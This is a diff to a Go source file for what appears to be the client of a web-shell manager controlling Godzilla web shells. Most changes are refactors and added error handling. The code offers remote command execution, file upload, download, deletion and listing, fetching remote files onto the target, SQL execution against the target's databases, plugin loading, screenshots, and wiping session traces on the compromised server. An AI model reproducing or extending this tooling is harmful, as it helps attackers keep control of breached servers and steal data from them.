@@ -4,13 +4,13 @@ import (
 	"bytes"
 	"errors"
 	"fmt"
-	"github.com/Go0p/wsm/lib/dynamic"
-	"github.com/Go0p/wsm/lib/gzip"
-	"github.com/Go0p/wsm/lib/httpx"
-	"github.com/Go0p/wsm/lib/payloads"
-	"github.com/Go0p/wsm/lib/shell"
-	"github.com/Go0p/wsm/lib/shell/godzilla"
-	"github.com/Go0p/wsm/lib/utils"
+	"github.com/go0p/wsm/lib/dynamic"
+	"github.com/go0p/wsm/lib/gzip"
+	"github.com/go0p/wsm/lib/httpx"
+	"github.com/go0p/wsm/lib/payloads"
+	"github.com/go0p/wsm/lib/shell"
+	"github.com/go0p/wsm/lib/shell/godzilla"
+	"github.com/go0p/wsm/lib/utils"
 	"strconv"
 	"strings"
 )
@@ -39,6 +39,10 @@ func (g *GodzillaInfo) setDefaultParams() map[string]string {
 }
 
 func NewGodzillaInfo(g *GodzillaInfo) (*GodzillaInfo, error) {
+	err := g.Verify()
+	if err != nil {
+		return nil, err
+	}
 	g.secretKey = utils.SecretKey(g.Key)
 	g.dynamicFuncName = g.setDefaultParams()
 
@@ -185,7 +189,7 @@ func (g *GodzillaInfo) dynamicUpdateClassName(oldName string, classContent []byt
 	return dynamic.ReplaceClassName(classContent, oldName, newClassName)
 }
 
-func getParameter() *godzilla.Parameter {
+func newParameter() *godzilla.Parameter {
 	return &godzilla.Parameter{
 		HashMap: make(map[string]interface{}, 2),
 		Size:    0,
@@ -208,7 +212,7 @@ func (g *GodzillaInfo) InjectPayload() error {
 
 // 检测 payload 是否正常
 func (g *GodzillaInfo) test() (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	result, err := g.EvalFunc("", "test", parameter)
 	if err != nil {
 		return false, err
@@ -222,7 +226,7 @@ func (g *GodzillaInfo) test() (bool, error) {
 
 // 获取基础信息
 func (g *GodzillaInfo) getBasicsInfo() ([]byte, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	basicsInfo, err := g.EvalFunc("", "getBasicsInfo", parameter)
 	if err != nil {
 		return nil, err
@@ -238,9 +242,12 @@ func (g *GodzillaInfo) getBasicsInfo() ([]byte, error) {
 
 // 命令执行，这个地方的传参处理好复杂啊，我真的不行了,栓Q =_=!
 func (g *GodzillaInfo) execCommand(commandStr string) (string, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	// 这个 cmdLine 参数多半是为了兼容 godzilla v3 ?
-	cl, _ := g.encoding.CharsetEncode(commandStr)
+	cl, err := g.encoding.CharsetEncode(commandStr)
+	if err != nil {
+		return "", err
+	}
 	parameter.AddBytes("cmdLine", cl)
 	commandArgs := godzilla.SplitArgs(commandStr, 10000, false)
 	for i := 0; i < len(commandArgs); i++ {
@@ -273,20 +280,28 @@ func (g *GodzillaInfo) execCommand(commandStr string) (string, error) {
 }
 
 func (g *GodzillaInfo) getFile(filePath string) (string, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	if len(filePath) == 0 {
 		filePath = " "
 	}
-	parameter.AddBytes("dirName", []byte(filePath))
+	enFilePath, err := g.encoding.CharsetEncode(filePath)
+	if err != nil {
+		return "", err
+	}
+	parameter.AddBytes("dirName", enFilePath)
 	res, err := g.EvalFunc("", "getFile", parameter)
 	if err != nil {
 		return "", err
 	}
-	return string(res), err
+	decode, err := g.encoding.CharsetDecode(res)
+	if err != nil {
+		return "", err
+	}
+	return decode, nil
 }
 
 func (g *GodzillaInfo) downloadFile(fileName string) ([]byte, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddBytes("fileName", []byte(fileName))
 	result, err := g.EvalFunc("", "readFile", parameter)
 	if err != nil {
@@ -296,7 +311,7 @@ func (g *GodzillaInfo) downloadFile(fileName string) ([]byte, error) {
 }
 
 func (g *GodzillaInfo) uploadFile(fileName string, data []byte) (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddBytes("fileName", []byte(fileName))
 	parameter.AddBytes("fileValue", data)
 	result, err := g.EvalFunc("", "uploadFile", parameter)
@@ -312,7 +327,7 @@ func (g *GodzillaInfo) uploadFile(fileName string, data []byte) (bool, error) {
 }
 
 func (g *GodzillaInfo) copyFile(fileName, newFile string) (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddBytes("srcFileName", []byte(fileName))
 	parameter.AddBytes("destFileName", []byte(newFile))
 	result, err := g.EvalFunc("", "copyFile", parameter)
@@ -328,7 +343,7 @@ func (g *GodzillaInfo) copyFile(fileName, newFile string) (bool, error) {
 }
 
 func (g *GodzillaInfo) deleteFile(fileName string) (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddBytes("fileName", []byte(fileName))
 	result, err := g.EvalFunc("", "deleteFile", parameter)
 	if err != nil {
@@ -343,7 +358,7 @@ func (g *GodzillaInfo) deleteFile(fileName string) (bool, error) {
 }
 
 func (g *GodzillaInfo) newFile(fileName string) (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddBytes("fileName", []byte(fileName))
 	result, err := g.EvalFunc("", "newFile", parameter)
 	if err != nil {
@@ -358,7 +373,7 @@ func (g *GodzillaInfo) newFile(fileName string) (bool, error) {
 }
 
 func (g *GodzillaInfo) moveFile(fileName, newFile string) (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddBytes("srcFileName", []byte(fileName))
 	parameter.AddBytes("destFileName", []byte(newFile))
 	result, err := g.EvalFunc("", "moveFile", parameter)
@@ -373,7 +388,7 @@ func (g *GodzillaInfo) moveFile(fileName, newFile string) (bool, error) {
 }
 
 func (g *GodzillaInfo) newDir(fileName string) (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddBytes("dirName", []byte(fileName))
 	result, err := g.EvalFunc("", "newDir", parameter)
 	if err != nil {
@@ -388,7 +403,7 @@ func (g *GodzillaInfo) newDir(fileName string) (bool, error) {
 }
 
 func (g *GodzillaInfo) bigFileUpload(fileName string, position int, content []byte) (string, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddBytes("fileContents", content)
 	parameter.AddString("fileName", fileName)
 	parameter.AddString("position", strconv.Itoa(position))
@@ -400,7 +415,7 @@ func (g *GodzillaInfo) bigFileUpload(fileName string, position int, content []by
 }
 
 func (g *GodzillaInfo) bigFileDownload(fileName string, position, readByteNum int) ([]byte, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddString("position", strconv.Itoa(position))
 	parameter.AddString("readByteNum", strconv.Itoa(readByteNum))
 	parameter.AddString("fileName", fileName)
@@ -412,7 +427,7 @@ func (g *GodzillaInfo) bigFileDownload(fileName string, position, readByteNum in
 	return res, nil
 }
 func (g *GodzillaInfo) fileRemoteDown(url, saveFile string) (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddBytes("url", []byte(url))
 	parameter.AddBytes("saveFile", []byte(saveFile))
 	res, err := g.EvalFunc("", "fileRemoteDown", parameter)
@@ -428,7 +443,7 @@ func (g *GodzillaInfo) fileRemoteDown(url, saveFile string) (bool, error) {
 }
 
 func (g *GodzillaInfo) getFileSize(fileName string) (int, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddString("fileName", fileName)
 	parameter.AddString("mode", "fileSize")
 	result, err := g.EvalFunc("", "bigFileDownload", parameter)
@@ -444,7 +459,7 @@ func (g *GodzillaInfo) getFileSize(fileName string) (int, error) {
 }
 
 func (g *GodzillaInfo) setFileAttr(file, fileType, fileAttr string) (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddString("type", fileType)
 	parameter.AddBytes("fileName", []byte(file))
 	parameter.AddString("attr", fileAttr)
@@ -461,7 +476,7 @@ func (g *GodzillaInfo) setFileAttr(file, fileType, fileAttr string) (bool, error
 }
 
 func (g *GodzillaInfo) execSql(dbType, dbHost, dbUsername, dbPassword, execType, execSql string, dbPort int, options map[string]string) (string, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	parameter.AddString("dbType", dbType)
 	parameter.AddString("dbHost", dbHost)
 	parameter.AddString("dbPort", strconv.Itoa(dbPort))
@@ -498,7 +513,7 @@ func (g *GodzillaInfo) execSql(dbType, dbHost, dbUsername, dbPassword, execType,
 
 // Include 远程 shell 加载插件
 func (g *GodzillaInfo) Include(codeName string, binCode []byte) (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	if g.Script == shell.JavaScript {
 		binCode = g.dynamicUpdateClassName(codeName, binCode)
 		codeName = g.dynamicFuncName[codeName]
@@ -551,7 +566,7 @@ func (g *GodzillaInfo) Include(codeName string, binCode []byte) (bool, error) {
 
 // 销毁一个会话中的全部数据,这样做的效果有，清除目标服务器上的 sess_PHPSESSID 文件
 func (g *GodzillaInfo) close() (bool, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	res, err := g.EvalFunc("", "close", parameter)
 	if err != nil {
 		return false, err
@@ -564,7 +579,7 @@ func (g *GodzillaInfo) close() (bool, error) {
 	}
 }
 func (g *GodzillaInfo) screen() ([]byte, error) {
-	parameter := getParameter()
+	parameter := newParameter()
 	res, err := g.EvalFunc("", "screen", parameter)
 	if err != nil {
 		return nil, err
@@ -573,6 +588,32 @@ func (g *GodzillaInfo) screen() ([]byte, error) {
 		return res, nil
 	}
 	return nil, errors.New("response is empty")
+}
+
+func (g *GodzillaInfo) processParams(p shell.IParams) (map[string]string, error) {
+	//params := make(map[string]string, 2)
+	//var err error
+	//if p == nil {
+	//	switch i.(type) {
+	//	case *godzilla.ExecParams:
+	//		i.(*godzilla.ExecParams).SetDefaultAndCheckValue()
+	//		params["ExecParams"] = i.(*godzilla.ExecParams).ToCommand()
+	//	default:
+	//		return nil, errors.New(fmt.Sprintf("%v is undefined", i))
+	//	}
+	//} else {
+	err := p.SetDefaultAndCheckValue()
+	if err != nil {
+		return nil, err
+	}
+	params, err := utils.ToMapParams(p)
+	if err != nil {
+		return nil, err
+	}
+	fmt.Println(params)
+	//}
+
+	return params, err
 }
 
 func (g *GodzillaInfo) Ping(p ...shell.IParams) (bool, error) {
@@ -584,13 +625,49 @@ func (g *GodzillaInfo) BasicInfo(p ...shell.IParams) (shell.IResult, error) {
 	if err != nil {
 		return nil, err
 	}
-	return newGResult(info), nil
-}
-
-func (g *GodzillaInfo) CommandExec(c string) (shell.IResult, error) {
-	res, err := g.execCommand(c)
+	nr := newGResult(info, BasicInfo)
+	err = nr.Parser()
 	if err != nil {
 		return nil, err
 	}
-	return newGResult([]byte(res)), nil
+	return nr, nil
+}
+
+func (g *GodzillaInfo) CommandExec(p shell.IParams) (shell.IResult, error) {
+	//params, err := g.processParams(p)
+	err := p.SetDefaultAndCheckValue()
+	if err != nil {
+		return nil, err
+	}
+	realCommand := p.(*godzilla.ExecParams).RealCommand
+	res, err := g.execCommand(realCommand)
+	if err != nil {
+		return nil, err
+	}
+	return newGResult([]byte(res), Raw), nil
+}
+
+func (g *GodzillaInfo) OperationFile(p shell.IParams) (shell.IResult, error) {
+	err := p.SetDefaultAndCheckValue()
+	if err != nil {
+		return nil, err
+	}
+	var gres *gResult
+	switch p.(type) {
+	case *godzilla.GetFiles:
+		filePath := p.(*godzilla.GetFiles).DirName
+		res, err := g.getFile(filePath)
+		if err != nil {
+			return nil, err
+		}
+		gres = newGResult([]byte(res), FileOpt)
+		err = gres.Parser()
+		if err != nil {
+			return nil, err
+		}
+	}
+	return gres, nil
+}
+func (g *GodzillaInfo) OperationDatabase(p shell.IParams) (shell.IResult, error) {
+	return nil, nil
 }
